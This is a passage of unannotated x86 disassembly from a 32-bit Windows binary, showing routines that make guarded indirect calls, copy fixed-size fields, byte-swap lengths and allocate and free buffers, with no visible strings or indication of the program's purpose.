  404a71:	ff 73 04             	push   0x4(%ebx)
  404a74:	ff 15 8c 61 42 00    	call   *0x42618c
  404a7a:	ff d6                	call   *%esi
  404a7c:	8b 35 64 1c 44 00    	mov    0x441c64,%esi
  404a82:	83 c4 0c             	add    $0xc,%esp
  404a85:	8b ce                	mov    %esi,%ecx
  404a87:	ff 73 04             	push   0x4(%ebx)
  404a8a:	ff 15 8c 61 42 00    	call   *0x42618c
  404a90:	ff d6                	call   *%esi
  404a92:	83 c4 04             	add    $0x4,%esp
  404a95:	85 ed                	test   %ebp,%ebp
  404a97:	75 43                	jne    0x404adc
  404a99:	8b 35 5c 1c 44 00    	mov    0x441c5c,%esi
  404a9f:	8d 44 24 10          	lea    0x10(%esp),%eax
  404aa3:	55                   	push   %ebp
  404aa4:	68 10 1c 44 00       	push   $0x441c10
  404aa9:	50                   	push   %eax
  404aaa:	8b ce                	mov    %esi,%ecx
  404aac:	ff 15 8c 61 42 00    	call   *0x42618c
  404ab2:	ff d6                	call   *%esi
  404ab4:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  404aba:	83 c4 0c             	add    $0xc,%esp
  404abd:	8b ce                	mov    %esi,%ecx
  404abf:	68 10 1c 44 00       	push   $0x441c10
  404ac4:	ff 15 8c 61 42 00    	call   *0x42618c
  404aca:	ff d6                	call   *%esi
  404acc:	8b 35 54 1c 44 00    	mov    0x441c54,%esi
  404ad2:	8d 44 24 14          	lea    0x14(%esp),%eax
  404ad6:	83 c4 04             	add    $0x4,%esp
  404ad9:	50                   	push   %eax
  404ada:	eb 0b                	jmp    0x404ae7
  404adc:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  404ae2:	68 10 1c 44 00       	push   $0x441c10
  404ae7:	8b ce                	mov    %esi,%ecx
  404ae9:	ff 15 8c 61 42 00    	call   *0x42618c
  404aef:	ff d6                	call   *%esi
  404af1:	8b 44 24 18          	mov    0x18(%esp),%eax
  404af5:	83 c4 04             	add    $0x4,%esp
  404af8:	5f                   	pop    %edi
  404af9:	5e                   	pop    %esi
  404afa:	5d                   	pop    %ebp
  404afb:	5b                   	pop    %ebx
  404afc:	83 c4 08             	add    $0x8,%esp
  404aff:	c3                   	ret
  404b00:	55                   	push   %ebp
  404b01:	56                   	push   %esi
  404b02:	8b 74 24 10          	mov    0x10(%esp),%esi
  404b06:	33 ed                	xor    %ebp,%ebp
  404b08:	57                   	push   %edi
  404b09:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404b0d:	85 ff                	test   %edi,%edi
  404b0f:	75 45                	jne    0x404b56
  404b11:	8b 46 10             	mov    0x10(%esi),%eax
  404b14:	33 ff                	xor    %edi,%edi
  404b16:	3b 46 14             	cmp    0x14(%esi),%eax
  404b19:	73 2b                	jae    0x404b46
  404b1b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  404b20:	80 78 11 6c          	cmpb   $0x6c,0x11(%eax)
  404b24:	50                   	push   %eax
  404b25:	56                   	push   %esi
  404b26:	74 14                	je     0x404b3c
  404b28:	e8 f3 cb ff ff       	call   0x401720
  404b2d:	83 c4 08             	add    $0x8,%esp
  404b30:	3b 46 14             	cmp    0x14(%esi),%eax
  404b33:	72 eb                	jb     0x404b20
  404b35:	5f                   	pop    %edi
  404b36:	5e                   	pop    %esi
  404b37:	83 c8 ff             	or     $0xffffffff,%eax
  404b3a:	5d                   	pop    %ebp
  404b3b:	c3                   	ret
  404b3c:	e8 5f c7 ff ff       	call   0x4012a0
  404b41:	83 c4 08             	add    $0x8,%esp
  404b44:	8b f8                	mov    %eax,%edi
  404b46:	85 ff                	test   %edi,%edi
  404b48:	75 07                	jne    0x404b51
  404b4a:	5f                   	pop    %edi
  404b4b:	5e                   	pop    %esi
  404b4c:	83 c8 ff             	or     $0xffffffff,%eax
  404b4f:	5d                   	pop    %ebp
  404b50:	c3                   	ret
  404b51:	bd 01 00 00 00       	mov    $0x1,%ebp
  404b56:	53                   	push   %ebx
  404b57:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404b5b:	6a 10                	push   $0x10
  404b5d:	57                   	push   %edi
  404b5e:	8d 43 08             	lea    0x8(%ebx),%eax
  404b61:	50                   	push   %eax
  404b62:	e8 99 e9 00 00       	call   0x413500
  404b67:	6a 10                	push   $0x10
  404b69:	8d 47 10             	lea    0x10(%edi),%eax
  404b6c:	50                   	push   %eax
  404b6d:	8d 83 08 10 00 00    	lea    0x1008(%ebx),%eax
  404b73:	50                   	push   %eax
  404b74:	e8 87 e9 00 00       	call   0x413500
  404b79:	6a 10                	push   $0x10
  404b7b:	8d 47 30             	lea    0x30(%edi),%eax
  404b7e:	50                   	push   %eax
  404b7f:	8d 83 08 30 00 00    	lea    0x3008(%ebx),%eax
  404b85:	50                   	push   %eax
  404b86:	e8 75 e9 00 00       	call   0x413500
  404b8b:	8d 47 20             	lea    0x20(%edi),%eax
  404b8e:	50                   	push   %eax
  404b8f:	8d 86 70 20 00 00    	lea    0x2070(%esi),%eax
  404b95:	50                   	push   %eax
  404b96:	8d 83 08 20 00 00    	lea    0x2008(%ebx),%eax
  404b9c:	50                   	push   %eax
  404b9d:	e8 6e e0 ff ff       	call   0x402c10
  404ba2:	8b 47 40             	mov    0x40(%edi),%eax
  404ba5:	0f c8                	bswap  %eax
  404ba7:	89 83 0c 40 00 00    	mov    %eax,0x400c(%ebx)
  404bad:	40                   	inc    %eax
  404bae:	50                   	push   %eax
  404baf:	6a 01                	push   $0x1
  404bb1:	e8 87 cf 00 00       	call   0x411b3d
  404bb6:	89 83 08 40 00 00    	mov    %eax,0x4008(%ebx)
  404bbc:	8b 47 48             	mov    0x48(%edi),%eax
  404bbf:	0f c8                	bswap  %eax
  404bc1:	50                   	push   %eax
  404bc2:	89 83 14 40 00 00    	mov    %eax,0x4014(%ebx)
  404bc8:	e8 96 cf 00 00       	call   0x411b63
  404bcd:	89 83 10 40 00 00    	mov    %eax,0x4010(%ebx)
  404bd3:	8b 47 50             	mov    0x50(%edi),%eax
  404bd6:	0f c8                	bswap  %eax
  404bd8:	50                   	push   %eax
  404bd9:	89 83 1c 40 00 00    	mov    %eax,0x401c(%ebx)
  404bdf:	e8 7f cf 00 00       	call   0x411b63
  404be4:	8b 8b 08 40 00 00    	mov    0x4008(%ebx),%ecx
  404bea:	83 c4 40             	add    $0x40,%esp
  404bed:	89 83 18 40 00 00    	mov    %eax,0x4018(%ebx)
  404bf3:	85 c9                	test   %ecx,%ecx
  404bf5:	74 6a                	je     0x404c61
  404bf7:	83 bb 10 40 00 00 00 	cmpl   $0x0,0x4010(%ebx)
  404bfe:	74 61                	je     0x404c61
  404c00:	85 c0                	test   %eax,%eax
  404c02:	74 5d                	je     0x404c61
  404c04:	8b 47 44             	mov    0x44(%edi),%eax
  404c07:	ff b3 0c 40 00 00    	push   0x400c(%ebx)
  404c0d:	0f c8                	bswap  %eax
  404c0f:	03 c7                	add    %edi,%eax
  404c11:	50                   	push   %eax
  404c12:	51                   	push   %ecx
  404c13:	e8 68 58 00 00       	call   0x40a480
  404c18:	8b 47 4c             	mov    0x4c(%edi),%eax
  404c1b:	ff b3 14 40 00 00    	push   0x4014(%ebx)
  404c21:	0f c8                	bswap  %eax
  404c23:	03 c7                	add    %edi,%eax
  404c25:	50                   	push   %eax
  404c26:	ff b3 10 40 00 00    	push   0x4010(%ebx)
  404c2c:	e8 4f 58 00 00       	call   0x40a480
  404c31:	8b 47 54             	mov    0x54(%edi),%eax
  404c34:	ff b3 1c 40 00 00    	push   0x401c(%ebx)
  404c3a:	0f c8                	bswap  %eax
  404c3c:	03 c7                	add    %edi,%eax
  404c3e:	50                   	push   %eax
  404c3f:	ff b3 18 40 00 00    	push   0x4018(%ebx)
  404c45:	e8 36 58 00 00       	call   0x40a480
  404c4a:	83 c4 24             	add    $0x24,%esp
  404c4d:	85 ed                	test   %ebp,%ebp
  404c4f:	74 09                	je     0x404c5a
  404c51:	57                   	push   %edi
  404c52:	e8 f1 ce 00 00       	call   0x411b48
  404c57:	83 c4 04             	add    $0x4,%esp
  404c5a:	5b                   	pop    %ebx
  404c5b:	5f                   	pop    %edi
  404c5c:	5e                   	pop    %esi
  404c5d:	33 c0                	xor    %eax,%eax
  404c5f:	5d                   	pop    %ebp
  404c60:	c3                   	ret
  404c61:	68 cc 7c 42 00       	push   $0x427ccc
  404c66:	e8 e5 ce ff ff       	call   0x401b50
  404c6b:	83 c4 04             	add    $0x4,%esp
  404c6e:	83 c8 ff             	or     $0xffffffff,%eax
  404c71:	5b                   	pop    %ebx
  404c72:	5f                   	pop    %edi
  404c73:	5e                   	pop    %esi
  404c74:	5d                   	pop    %ebp
  404c75:	c3                   	ret
  404c76:	cc                   	int3
  404c77:	cc                   	int3
  404c78:	cc                   	int3
  404c79:	cc                   	int3
  404c7a:	cc                   	int3
  404c7b:	cc                   	int3
  404c7c:	cc                   	int3
  404c7d:	cc                   	int3
  404c7e:	cc                   	int3
  404c7f:	cc                   	int3
  404c80:	56                   	push   %esi
  404c81:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  404c87:	8b ce                	mov    %esi,%ecx
  404c89:	57                   	push   %edi
  404c8a:	68 0c 1c 44 00       	push   $0x441c0c
  404c8f:	ff 15 8c 61 42 00    	call   *0x42618c
  404c95:	ff d6                	call   *%esi
  404c97:	8b 7c 24 10          	mov    0x10(%esp),%edi
  404c9b:	83 c4 04             	add    $0x4,%esp
  404c9e:	83 bf 24 40 00 00 00 	cmpl   $0x0,0x4024(%edi)
  404ca5:	74 70                	je     0x404d17
  404ca7:	83 bf 28 40 00 00 00 	cmpl   $0x0,0x4028(%edi)
  404cae:	74 67                	je     0x404d17
  404cb0:	ff 74 24 10          	push   0x10(%esp)
  404cb4:	8b 35 30 1c 44 00    	mov    0x441c30,%esi
  404cba:	8b ce                	mov    %esi,%ecx
  404cbc:	ff 15 8c 61 42 00    	call   *0x42618c
  404cc2:	ff d6                	call   *%esi
  404cc4:	8b 35 44 1c 44 00    	mov    0x441c44,%esi
  404cca:	8d 47 04             	lea    0x4(%edi),%eax
  404ccd:	83 c4 04             	add    $0x4,%esp
  404cd0:	8b ce                	mov    %esi,%ecx
  404cd2:	6a 00                	push   $0x0
  404cd4:	6a 00                	push   $0x0
  404cd6:	57                   	push   %edi
  404cd7:	68 00 40 40 00       	push   $0x404000
  404cdc:	50                   	push   %eax
  404cdd:	ff 15 8c 61 42 00    	call   *0x42618c
  404ce3:	ff d6                	call   *%esi
  404ce5:	83 c4 14             	add    $0x14,%esp
  404ce8:	85 c0                	test   %eax,%eax
  404cea:	74 31                	je     0x404d1d
  404cec:	68 fc 7c 42 00       	push   $0x427cfc
  404cf1:	e8 5a ce ff ff       	call   0x401b50
  404cf6:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  404cfc:	83 c4 04             	add    $0x4,%esp
  404cff:	8b ce                	mov    %esi,%ecx
  404d01:	68 0c 1c 44 00       	push   $0x441c0c
  404d06:	ff 15 8c 61 42 00    	call   *0x42618c
  404d0c:	ff d6                	call   *%esi
  404d0e:	57                   	push   %edi
  404d0f:	e8 6c fb ff ff       	call   0x404880
  404d14:	83 c4 08             	add    $0x8,%esp
  404d17:	5f                   	pop    %edi
  404d18:	83 c8 ff             	or     $0xffffffff,%eax
  404d1b:	5e                   	pop    %esi
  404d1c:	c3                   	ret
  404d1d:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  404d23:	8b ce                	mov    %esi,%ecx
  404d25:	68 14 1c 44 00       	push   $0x441c14
  404d2a:	ff 15 8c 61 42 00    	call   *0x42618c
  404d30:	ff d6                	call   *%esi
  404d32:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  404d38:	83 c4 04             	add    $0x4,%esp
  404d3b:	8b ce                	mov    %esi,%ecx
  404d3d:	68 0c 1c 44 00       	push   $0x441c0c
  404d42:	ff 15 8c 61 42 00    	call   *0x42618c
  404d48:	ff d6                	call   *%esi
  404d4a:	8b 35 5c 1c 44 00    	mov    0x441c5c,%esi
